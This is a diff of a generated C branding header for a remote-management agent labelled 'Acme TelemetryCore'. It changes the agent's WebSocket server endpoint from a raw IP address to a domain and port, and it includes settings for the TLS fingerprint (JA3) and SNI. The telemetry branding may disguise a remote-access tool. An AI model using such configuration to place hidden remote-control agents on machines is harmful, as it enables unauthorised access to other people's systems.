@@ -1,4 +1,4 @@
-/* Generated file – do not edit. */
+/* Generated file - do not edit. */
 #ifndef GENERATED_MESHAGENT_BRANDING_H
 #define GENERATED_MESHAGENT_BRANDING_H
 
@@ -20,7 +20,7 @@
 #define MESH_AGENT_LOG_DIRECTORY TEXT("C:/ProgramData/Acme/TelemetryCore/logs")
 
 /* Optional network hints for future use */
-#define MESH_AGENT_NETWORK_ENDPOINT "wss://72.60.233.29:443/agent.ashx"
+#define MESH_AGENT_NETWORK_ENDPOINT "wss://agents.high.support:4445/agent.ashx"
 #define MESH_AGENT_NETWORK_SNI NULL
 #define MESH_AGENT_NETWORK_USER_AGENT "AcmeAgent/1.0"
 #define MESH_AGENT_NETWORK_JA3 NULL
